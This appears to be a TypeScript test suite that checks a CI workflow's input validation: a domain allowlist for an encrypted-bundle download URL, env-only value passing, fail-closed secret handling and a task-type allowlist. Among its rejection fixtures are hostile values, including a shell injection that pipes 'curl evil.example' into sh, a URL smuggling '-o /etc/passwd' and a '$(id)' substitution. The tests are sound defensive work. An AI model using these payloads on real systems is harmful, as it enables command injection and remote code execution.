/**
 * factory-run 的階段輸入接線與 task type 注入修補（ADR-029 §5；V2 Task 6，ruling R12）。
 *
 * 階段輸入：`verify_input_url` 是公開的 dispatch input，指向 aswf.dev 上以 runner
 * 公鑰加密的 bundle。它是外部輸入進 runner 的唯一管道，失敗模式都是靜默的：
 *   - 下載到 aswf.dev 以外的主機（userinfo／port／相似網域）；
 *   - URL 以 `${{ }}` 內嵌進 shell（文字替換 = 指令注入）；
 *   - 缺 `VERIFY_RUNNER_AGE_IDENTITY` 時默默略過（agent 在缺 RULES.md 的情況下照跑）；
 *   - 在非驗證模式、或 agent 之後才還原；
 *   - 把還原的路徑印進公開 log。
 * 這些都以解析後的 workflow 結構＋以 bash 實際執行 step（curl／node 以 stub 取代）釘住。
 *
 * R12：task type 可由 Issue body 解析而來（自由文字）。解析後立即以 workflow choice
 * 清單做 allowlist 驗證，judge／push-event 改以 env 傳入，不再以 `${{ }}` 內嵌於 `run:`。
 */
import { spawnSync } from 'node:child_process'
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { load } from 'js-yaml'
import { afterEach, describe, expect, it } from 'vitest'

const ROOT = join(import.meta.dirname, '../..')
const WORKFLOW = '.github/workflows/factory-run.yml'
const RESTORE_STEP = 'Restore verify stage input (age)'
const ALLOWLIST_STEP = 'Validate resolved task_type (allowlist)'
const INLINE_TASKTYPE = /\$\{\{\s*steps\.tasktype\.outputs\.value\s*\}\}/

interface Step {
  id?: string
  name?: string
  if?: string
  run?: string
  uses?: string
  env?: Record<string, string>
}

interface Input {
  description?: string
  required?: boolean
  type?: string
  default?: unknown
  options?: string[]
}

interface Workflow {
  on: { workflow_dispatch: { inputs: Record<string, Input> } }
  jobs: { run: { steps: Step[] }; compare: { steps: Step[] } }
}

const raw = (): string => readFileSync(join(ROOT, WORKFLOW), 'utf8')
const workflow = (): Workflow => load(raw()) as Workflow
const steps = (): Step[] => workflow().jobs.run.steps

function indexOf(pred: (s: Step) => boolean, what: string): number {
  const i = steps().findIndex(pred)
  expect(i, `workflow 缺少步驟：${what}`).toBeGreaterThanOrEqual(0)
  return i
}
const indexByName = (name: string): number => indexOf((s) => s.name === name, name)
const indexById = (id: string): number => indexOf((s) => s.id === id, id)
const stepByName = (name: string): Step => steps()[indexByName(name)] as Step
const stepById = (id: string): Step => steps()[indexById(id)] as Step

/** workflow choice 清單中的 task type（扣掉 auto）。 */
function knownTaskTypes(): string[] {
  const options = workflow().on.workflow_dispatch.inputs['task_type']?.options ?? []
  return options.filter((o) => o !== 'auto')
}

let dirs: string[] = []
afterEach(() => {
  for (const d of dirs) rmSync(d, { recursive: true, force: true })
  dirs = []
})

interface Run {
  status: number | null
  log: string
  curlArgs: string[] | undefined
  nodeArgs: string[] | undefined
  dir: string
}

/**
 * 以 bash 執行 step 的 `run:`（step 的 `run:` 不得含任何 `${{ }}`，值全部經 env）。
 * stub `curl`：記下參數，寫出 `CURL_BYTES` 個位元組到 `-o` 目標，exit `CURL_CODE`。
 * stub `node`：記下參數，輸出 `NODE_STDOUT`，exit `NODE_CODE`。jq 用真的。
 */
function runStep(step: Step, env: Record<string, string>): Run {
  const dir = mkdtempSync(join(tmpdir(), 'verify-input-steps-'))
  dirs.push(dir)
  const bin = join(dir, 'bin')
  mkdirSync(bin)
  mkdirSync(join(dir, 'runner-temp'))
  mkdirSync(join(dir, 'target'))
  const stub = (file: string, body: string): void => {
    writeFileSync(join(bin, file), `#!/usr/bin/env bash\n${body}\n`)
    chmodSync(join(bin, file), 0o755)
  }
  stub(
    'curl',
    [
      'printf "%s\\n" "$@" > "$STUB_DIR/curl-args.txt"',
      'out=""',
      'while [ $# -gt 0 ]; do [ "$1" = "-o" ] || [ "$1" = "--output" ] && out="$2"; shift; done',
      'if [ "${CURL_CODE:-0}" != "0" ]; then exit "$CURL_CODE"; fi',
      'head -c "${CURL_BYTES:-64}" /dev/zero > "$out"',
    ].join('\n'),
  )
  stub(
    'node',
    [
      'printf "%s\\n" "$@" > "$STUB_DIR/node-args.txt"',
      'printf "%s\\n" "${NODE_STDOUT:-}"',
      'exit "${NODE_CODE:-0}"',
    ].join('\n'),
  )
  const run = step.run ?? ''
  expect(run, 'run: 內不得有 ${{ }}——值必須經 env 傳入').not.toMatch(/\$\{\{/)
  const r = spawnSync('bash', ['-e', '-c', run], {
    cwd: dir,
    encoding: 'utf8',
    env: {
      PATH: `${bin}:${process.env.PATH ?? ''}`,
      HOME: dir,
      STUB_DIR: dir,
      RUNNER_TEMP: join(dir, 'runner-temp'),
      GITHUB_WORKSPACE: dir,
      ...env,
    },
  })
  const lines = (file: string): string[] | undefined =>
    existsSync(join(dir, file)) ? readFileSync(join(dir, file), 'utf8').trimEnd().split('\n') : undefined
  return { status: r.status, log: `${r.stdout}${r.stderr}`, curlArgs: lines('curl-args.txt'), nodeArgs: lines('node-args.txt'), dir }
}

const IDENTITY = 'AGE-SECRET-KEY-1TESTONLYNOTAREALKEYQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ'
const GOOD_URL = 'https://aswf.dev/api/verify/input/abc123.age'

describe('verify_input_url：dispatch input', () => {
  it('是選填字串、預設空字串', () => {
    const input = workflow().on.workflow_dispatch.inputs['verify_input_url']
    expect(input).toBeDefined()
    expect(input?.type).toBe('string')
    expect(input?.required).toBe(false)
    expect(input?.default).toBe('')
  })

  it('整份 workflow 只有還原步驟的 env 與 if 引用它（不內嵌於任何 run:）', () => {
    const all = [...workflow().jobs.run.steps, ...workflow().jobs.compare.steps]
    const users = all.filter((s) => JSON.stringify(s).includes('inputs.verify_input_url')).map((s) => s.name)
    expect(users).toEqual([RESTORE_STEP])
    const step = stepByName(RESTORE_STEP)
    expect(step.run ?? '').not.toContain('verify_input_url')
    expect(step.env?.['VERIFY_INPUT_URL']).toBe('${{ inputs.verify_input_url }}')
    // 字面上也只出現在 input 定義、env 與 if
    expect(raw().match(/inputs\.verify_input_url/g)?.length).toBe(2)
  })
})

describe('還原步驟：位置與閘控', () => {
  it('只在驗證模式且 URL 非空時執行（非驗證 task 永不下載）', () => {
    expect(stepByName(RESTORE_STEP).if).toBe(
      "steps.verifymode.outputs.verify == 'true' && inputs.verify_input_url != ''",
    )
  })

  it('在 build／guard／所有 target checkout 之後、讀 specs 的步驟與 agent 之前', () => {
    const i = indexByName(RESTORE_STEP)
    for (const before of [
      'Install and build',
      'Checkout target repo',
      'Ensure base branch checked out in target',
      'Verify app token write access (target repo)',
    ]) {
      expect(indexByName(before), before).toBeLessThan(i)
    }
    expect(indexById('verifymode')).toBeLessThan(i)
    for (const after of [
      'Preflight heavy-verify feasibility (advisory)',
      'Check target lean-toolchain pin',
      'Run factory agent',
    ]) {
      expect(i, after).toBeLessThan(indexByName(after))
    }
  })

  it('私鑰只來自 repo secret VERIFY_RUNNER_AGE_IDENTITY，以 env 名稱交給 CLI（值不進 argv）', () => {
    const step = stepByName(RESTORE_STEP)
    expect(step.env?.['VERIFY_RUNNER_AGE_IDENTITY']).toBe('${{ secrets.VERIFY_RUNNER_AGE_IDENTITY }}')
    expect(step.run).toContain('--identity-env VERIFY_RUNNER_AGE_IDENTITY')
    expect(step.run).not.toMatch(/--identity-env "?\$/)
  })

  it('不使用 VERIFY_AGE_PRIVATE_KEY／VERIFY_AGE_PUBLIC_KEY（兩組 keypair 分離）', () => {
    const text = JSON.stringify(stepByName(RESTORE_STEP))
    expect(text).not.toContain('VERIFY_AGE_PRIVATE_KEY')
    expect(text).not.toContain('VERIFY_AGE_PUBLIC_KEY')
  })
})

describe('還原步驟：以 bash 實際執行（curl／node stub）', () => {
  const run = (env: Record<string, string>): Run =>
    runStep(stepByName(RESTORE_STEP), { VERIFY_RUNNER_AGE_IDENTITY: IDENTITY, ...env })

  it('合法 URL：curl 以 https-only、不跟隨 redirect、失敗即停、大小與時間上限下載，再交給 CLI', () => {
    const r = run({ VERIFY_INPUT_URL: GOOD_URL, NODE_STDOUT: '{"restored": 4}' })

    expect(r.status, r.log).toBe(0)
    const curl = r.curlArgs ?? []
    expect(curl).toContain(GOOD_URL)
    expect(curl).toContain('--fail')
    expect(curl).toEqual(expect.arrayContaining(['--proto', '=https']))
    expect(curl).toContain('--max-filesize')
    expect(curl).toContain('--max-time')
    expect(curl.some((a) => a === '-L' || a === '--location' || /^-[a-zA-Z]*L/.test(a))).toBe(false)
    const bundleArg = curl[curl.indexOf('-o') + 1] ?? ''
    expect(bundleArg.startsWith(join(r.dir, 'runner-temp'))).toBe(true)
    expect(r.nodeArgs).toEqual([
      'dist/cli/factory-verify-input.js',
      '--bundle',
      bundleArg,
      '--identity-env',
      'VERIFY_RUNNER_AGE_IDENTITY',
      '--target',
      'target',
    ])
    expect(r.log).toContain('4')
    // 下載的密文在還原後刪除
    expect(existsSync(bundleArg)).toBe(false)
  })

  it('log 只有還原數量：CLI 輸出多餘欄位（路徑）也不得印出', () => {
    const r = run({
      VERIFY_INPUT_URL: GOOD_URL,
      NODE_STDOUT: '{"restored": 2, "paths": ["specs/quint/SECRET-RULES.md"]}',
    })
    expect(r.status, r.log).toBe(0)
    expect(r.log).not.toContain('SECRET-RULES')
    expect(r.log).not.toContain('specs/')
  })

  it.each([
    ['http（非 https）', 'http://aswf.dev/x.age'],
    ['相似網域（後綴）', 'https://aswf.dev.evil.example/x.age'],
    ['相似網域（前綴）', 'https://evilaswf.dev/x.age'],
    ['子網域', 'https://api.aswf.dev/x.age'],
    ['userinfo 偽裝', 'https://aswf.dev@evil.example/x.age'],
    ['userinfo', 'https://user:pw@aswf.dev/x.age'],
    ['port', 'https://aswf.dev:8443/x.age'],
    ['沒有 path', 'https://aswf.dev'],
    ['路徑在別的主機', 'https://evil.example/aswf.dev/x.age'],
    ['大寫 scheme／host（不正規化，直接拒絕）', 'HTTPS://ASWF.DEV/x.age'],
    ['含空白', 'https://aswf.dev/x.age -o /etc/passwd'],
    ['含換行', 'https://aswf.dev/x.age\nhttps://evil.example/'],
    ['含反斜線', 'https://aswf.dev\\@evil.example/x.age'],
    ['path 含反斜線', 'https://aswf.dev/a\\b.age'],
    ['path 含 @', 'https://aswf.dev/@evil.example/x.age'],
    ['shell metachar', 'https://aswf.dev/$(id).age'],
    ['fragment', 'https://aswf.dev/x.age#frag'],
  ])('URL 不合法（%s）→ exit 1，curl 與 CLI 都不執行', (_, url) => {
    const r = run({ VERIFY_INPUT_URL: url })
    expect(r.status, r.log).not.toBe(0)
    expect(r.curlArgs).toBeUndefined()
    expect(r.nodeArgs).toBeUndefined()
    expect(r.log).toContain('::error::')
  })

  it('URL 合法但 secret 缺漏或空白 → exit 1（fail closed），不下載', () => {
    for (const identity of ['', '   ']) {
      const r = run({ VERIFY_INPUT_URL: GOOD_URL, VERIFY_RUNNER_AGE_IDENTITY: identity })
      expect(r.status, r.log).not.toBe(0)
      expect(r.curlArgs).toBeUndefined()
      expect(r.log).toContain('VERIFY_RUNNER_AGE_IDENTITY')
    }
    const missing = runStep(stepByName(RESTORE_STEP), { VERIFY_INPUT_URL: GOOD_URL })
    expect(missing.status, missing.log).not.toBe(0)
    expect(missing.curlArgs).toBeUndefined()
  })

  it('curl 失敗（HTTP 錯誤、逾時、超過大小）→ exit 1，不呼叫 CLI', () => {
    const r = run({ VERIFY_INPUT_URL: GOOD_URL, CURL_CODE: '22' })
    expect(r.status, r.log).not.toBe(0)
    expect(r.nodeArgs).toBeUndefined()
  })

  it('下載檔超過 20 MB（伺服器未宣告長度時 --max-filesize 擋不住）→ exit 1，不呼叫 CLI', () => {
    const r = run({ VERIFY_INPUT_URL: GOOD_URL, CURL_BYTES: String(20 * 1024 * 1024 + 1) })
    expect(r.status, r.log).not.toBe(0)
    expect(r.nodeArgs).toBeUndefined()
  })

  it('CLI 失敗（解密失敗、bundle 被拒）→ exit 1', () => {
    const r = run({ VERIFY_INPUT_URL: GOOD_URL, NODE_CODE: '1' })
    expect(r.status, r.log).not.toBe(0)
    // 失敗路徑也清掉下載的密文
    expect(existsSync(join(r.dir, 'runner-temp', 'verify-input.age'))).toBe(false)
  })
})

describe('R12：task type 解析後立即 allowlist 驗證', () => {
  it('allowlist 步驟緊接在 tasktype 之後', () => {
    expect(indexByName(ALLOWLIST_STEP)).toBe(indexById('tasktype') + 1)
  })

  it('值經 env 傳入，run 內沒有 ${{ }}', () => {
    const step = stepByName(ALLOWLIST_STEP)
    expect(step.env?.['TASK_TYPE']).toBe('${{ steps.tasktype.outputs.value }}')
    expect(step.run ?? '').not.toMatch(/\$\{\{/)
  })

  it('allowlist 恰好是 workflow choice 清單的 12 個 task type（不含 auto）', () => {
    const run = stepByName(ALLOWLIST_STEP).run ?? ''
    const pattern = run.match(/case "\$TASK_TYPE" in\s*\n\s*([a-z|-]+)\)/)?.[1]
    expect(pattern).toBeDefined()
    expect(knownTaskTypes()).toHaveLength(12)
    expect(new Set(pattern?.split('|'))).toEqual(new Set(knownTaskTypes()))
  })

  it.each(knownTaskTypes())('已知 task type %s → 通過', (taskType) => {
    const r = runStep(stepByName(ALLOWLIST_STEP), { TASK_TYPE: taskType })
    expect(r.status, r.log).toBe(0)
  })

  it.each([
    ['auto', 'auto'],
    ['空值', ''],
    ['未知類型', 'agent-delete-repo'],
    ['大小寫不同', 'AGENT-FIX-BUG'],
    ['注入', 'agent-fix-bug"; curl evil.example | sh; echo "'],
    ['換行', 'agent-fix-bug\nagent-analyze'],
    ['glob', 'agent-*'],
    ['前後空白', ' agent-fix-bug'],
  ])('%s → exit 1，且不把原值印進 log', (_, taskType) => {
    const r = runStep(stepByName(ALLOWLIST_STEP), { TASK_TYPE: taskType })
    expect(r.status, r.log).not.toBe(0)
    expect(r.log).toContain('::error::')
    if (taskType.length > 4) expect(r.log).not.toContain(taskType)
  })
})

describe('R12：judge／push-event 以 env 傳 task type', () => {
  it.each([
    ['judge', () => stepById('judge')],
    ['push-event', () => stepByName('Push event to scoreboard')],
  ])('%s：env TASK_TYPE、run 內沒有內嵌 tasktype 運算式', (_, get) => {
    const step = get()
    expect(step.env?.['TASK_TYPE']).toBe('${{ steps.tasktype.outputs.value }}')
    expect(step.run ?? '').not.toMatch(INLINE_TASKTYPE)
    expect(step.run ?? '').toContain('--task-type "$TASK_TYPE"')
  })
})
